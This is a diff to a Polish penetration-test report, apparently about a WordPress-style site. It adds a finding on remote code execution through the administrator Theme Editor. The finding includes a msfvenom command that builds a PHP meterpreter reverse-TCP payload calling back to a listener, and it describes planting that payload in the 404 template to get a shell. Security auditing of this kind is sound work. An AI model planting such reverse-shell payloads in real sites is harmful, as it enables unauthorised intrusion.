@@ -631,6 +631,19 @@ W powyższym teście sprawdzone zostało również, czy wyświetli się zawarto�
 
 **Zalecenia:** 
 
+## Zdalne wykonywanie kodu (edycja motywów)
+**Stopień zagrożenia:** 5.5 - CVSS  (Wektor: `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:L/I:L/A:L`)
+
+**Położenie:** Podatność może być umieszczona w dowolnym miejscu za pomocą interfejsu `Appearance/Theme Editor`.
+
+**Opis:** Interfejs administratora pozwala na wgranie złośliwego kodu.
+
+**Koncepcja:** Korzystając ze zdobytego konta administratora, uruchomiono panel `Appearance/Theme Editor`. Następnie, na wzorcu strony błędu 404 dodano kod PHP wygenerowany za pomocą narzędzia *msfvenom* z następującymi opcjami: `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.132 LPORT=4444 R`.
+
+Następnie uruchomiono nasłuchiwane za pomocą modułu metasploit `multi/hanlder` oraz uruchomiono stronę 404. Poskutkowało to uzyskaniem sesji meterpretera na użytkowniku bez uprawnień root. Ze wzgledu na ograniczone możliwości webshelli PHP, niektóre funkcje meterpretera nie działają, przez co nie da się podwyższyć uprawnień.
+
+**Zalecenia:** Podatność ta jest znana przez organizację. Zapobiec jej można jedynie usuwając tą funkcjonalność, jednak powszechnie zalecanym rozwiązaniem jest ostrożne rozdawanie uprawnień oraz korzystanie z silnych haseł na kontach z dostępem do omawianego interfejsu.
+
 ## Wzór opisu zagrożenia (nazwa tutaj)
 **Stopień zagrożenia:**  - CVSS  (Wektor: `DoubleClickMe`)
 
